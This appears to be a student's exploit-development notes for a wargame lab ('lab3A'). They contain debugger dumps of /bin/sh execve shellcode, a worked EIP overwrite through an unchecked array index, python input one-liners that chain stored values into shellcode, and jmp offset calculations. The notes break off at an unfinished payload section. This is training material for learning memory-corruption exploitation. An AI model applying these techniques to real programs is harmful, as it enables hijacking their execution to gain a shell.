@@ -1,0 +1,190 @@
+kileak 11:54 AM
+as a sidenote, you're starting /bin/sh from a 32 bit app, but it seems to start the 64bit /bin/sh
+the error you "cannot execute: %%%%UU" is a 64 bit address (0x5555xxxxxxx) (edited) 
+
+
+
+0xffffd1ae in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
+ EAX  0xb
+ EBX  0xffffd324 ◂— '/bin//sh'
+ ECX  0x0
+ EDX  0x0
+ EDI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
+ ESI  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
+ EBP  0x0
+ ESP  0xffffd324 ◂— '/bin//sh'
+ EIP  0xffffd1ae ◂— 0x80cd
+───────────────────────────────────────[ DISASM ]───────────────────────────────────────
+   0xffffd1a0    mov    ebx, esp
+   0xffffd1a2    mov    ecx, eax
+   0xffffd1a4    mov    edx, eax
+   0xffffd1a6    jmp    0xffffd1ac
+    ↓
+   0xffffd1ac    mov    al, 0xb
+ ► 0xffffd1ae    int    0x80 <SYS_execve>
+        path: 0xffffd324 ◂— '/bin//sh'
+        argv: 0x0
+        envp: 0x0
+   0xffffd1b0    add    byte ptr [eax], al
+   0xffffd1b2    add    byte ptr [eax], al
+   0xffffd1b4    add    byte ptr [eax], al
+   0xffffd1b6    add    byte ptr [eax], al
+   0xffffd1b8    add    byte ptr [eax], al
+───────────────────────────────────────[ STACK ]────────────────────────────────────────
+00:0000│ ebx esp  0xffffd324 ◂— '/bin//sh'
+01:0004│          0xffffd328 ◂— '//sh'
+02:0008│          0xffffd32c ◂— 0x0
+03:000c│          0xffffd330 ◂— 0x1
+04:0010│          0xffffd334 —▸ 0xffffd3c8 ◂— 0x0
+05:0014│          0xffffd338 —▸ 0xffffd47c ◂— 0x0
+06:0018│          0xffffd33c —▸ 0xffffd354 ◂— 0x0
+07:001c│          0xffffd340 ◂— 0x1
+─────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
+ ► f 0 ffffd1ae
+pwndbg> 
+process 12115 is executing new program: ���VUU
+warning: ���VUU: No such file or directory.
+Reading /lib64/ld-linux-x86-64.so.2 from remote target...
+Reading /lib64/ld-linux-x86-64.so.2 from remote target...
+Downloading '/lib/i386-linux-gnu/libc-2.28.so' from the remote server: OK
+add-symbol-file /tmp/tmps2n6oq5u/libc-2.28.so 0xf7dc0000 -s .note.gnu.build-id 0xf7dc01b4 -s .note.ABI-tag 0xf7dc01d8 -s .gnu.hash 0xf7dc01f8 -s .dynsym 0xf7dc410c -s .dynstr 0xf7dcdecc -s .gnu.version 0xf7dd430a -s .gnu.version_d 0xf7dd56c4 -s .gnu.version_r 0xf7dd5c4c -s .rel.dyn 0xf7dd5c8c -s .rel.plt 0xf7dd885c -s .plt 0xf7dd9000 -s .plt.got 0xf7dd90c0 -s .text 0xf7dd90e0 -s __libc_freeres_fn 0xf7f25d80 -s .rodata 0xf7f27000 -s .interp 0xf7f483e8 -s .eh_frame_hdr 0xf7f483fc -s .eh_frame 0xf7f4eca0 -s .gcc_except_table 0xf7f9256c -s .hash 0xf7f92ae4 -s .tdata 0xf7f98170 -s .tbss 0xf7f98178 -s .init_array 0xf7f98178 -s __libc_subfreeres 0xf7f98184 -s __libc_atexit 0xf7f981fc -s __libc_IO_vtables 0xf7f98200 -s .data.rel.ro 0xf7f989e0 -s .dynamic 0xf7f99d6c -s .got 0xf7f99e5c -s .got.plt 0xf7f9a000 -s .data 0xf7f9a040 -s .bss 0xf7f9af00
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x8048c3b
+
+shellcode start: 0xffffd17c
+
+
+
+
+
+
+EIP Overflow:
+===============================================================================
+
+1. Finding the overflow
+
+Place an invalid number in index and crash happens.
+Able to read places on the stack.
+
+>>> int('0xa98ac7', 16)
+11111111
+>>> int('0x457', 16)
+1111
+
+
+# EIP overwrite - ret2shell
+r.sendline('store')     # Command
+r.recv()
+r.sendline(str(ret2shell))    # ret2shell
+r.recv()
+r.sendline('%d' % num)    # Index
+r.recv()
+r.sendline("quit")
+===============================================================================
+
+
+
+
+EIP Control:
+===============================================================================
+
+lab3A@box:
+r < <(python -c 'print "store"; print int("0x42424242",16); print "109"; print "quit"')
+
+
+
+data[1]   = 0x43434343
+ret2shell = 0x42424242
+r < <(python -c 'print "store"; print int("0x43434343",16); print "1" ; print "store"; print int("0x42424242",16); print "109"; print "quit"')
+
+0x42424242 in ?? ()
+gdb-peda$ find "CCCC"
+Searching for 'CCCC' in: None ranges
+Found 1 results, display max 1 items:
+[stack] : 0xbffff54c ("CCCC")
+
+
+[-------------------------------------code-------------------------------------]
+   0xbffff542:	push   DWORD PTR [edi-0x40000a58]
+   0xbffff548:	add    BYTE PTR [eax],al
+   0xbffff54a:	add    BYTE PTR [eax],al
+=> 0xbffff54c:	inc    ebx
+   0xbffff54d:	inc    ebx
+   0xbffff54e:	inc    ebx
+   0xbffff54f:	inc    ebx
+   0xbffff550:	add    BYTE PTR [eax],al
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff700 --> 0x1 
+0004| 0xbffff704 --> 0xbffff798 --> 0x0 
+0008| 0xbffff708 --> 0xbffff7f4 --> 0x0 
+0012| 0xbffff70c --> 0xb7feccea (<call_init+26>:	add    ebx,0x12316)
+0016| 0xbffff710 --> 0x1 
+0020| 0xbffff714 --> 0xbffff794 --> 0xbffff8b4 --> 0x0 
+0024| 0xbffff718 --> 0xbffff734 --> 0x4dbf8d8b 
+0028| 0xbffff71c --> 0x804a27c --> 0xb7e3c990 (<__libc_start_main>:	push   ebp)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xbffff54c in ?? ()
+
+
+
+"CCCC" is NOT read as a string, but as OPCODE.
+
+r < <(python -c 'print "store"; print int("0x43434343",16); print "1" ; print "store"; print int("0x01e94343",16); print "2" ;print "store"; print int("0x00000000",16); print "3";print "store"; print int("0x90909090",16); print "4" ; print "store"; print int("0x01e99090",16); print "5" ; print "store"; print int("0x00000000",16); print "6" ; print "store"; print int("0x90909090",16); print "7" ; print "store"; print int("0xbffff54c",16); print "109"; print "quit"')
+
+blegh
+===============================================================================
+
+
+ret2shellcode:
+===============================================================================
+
+1. Inject up to 6 bytes.
+
+	The last 2 bytes cannot be overwritten because
+
+	if(index % 3 == 0 || (input >> 24) == 0xb7)
+    {
+        printf(" *** ERROR! ***\n");
+        printf("   This index is reserved for quend!\n");
+        printf(" *** ERROR! ***\n");
+        
+        return 1;
+    }
+
+	If the index pointer's value is divided by 3 and the modulus is 0, 
+	or the most right input value contains a 0xb7, error.
+
+2. JMP 6 bytes, landing at 12; where the shellcode continues.
+
+
+	To determine how many bytes to JMP;
+	NOP sled 0-6 bytes, 7-8 byte not allowed.
+	Locate where "DDDD" is on the stack
+	Find the difference between DDDD & ret = 12
+	We already injected 6 bytes so that makes 6 bytes we need to jump.
+
+	nasm > jmp 12
+	00000000  E907000000        jmp 0xc
+
+	shell_1 = 0x90909090	nop -> nop -> nop -> nop 
+	shell_2 = 0xe907cccc	jmp 0xc
+
+	>>> DDDD = "0xffffd188"
+	>>> ret = "0xffffd17c"
+	>>> int(DDDD,16) - int(ret,16)
+	12
+	>>>
+===============================================================================
+
+Payload:
+===============================================================================
+
+1. Replace NOP sled with shellcode, and keep the JMP offsets.
+
+
+===============================================================================
+
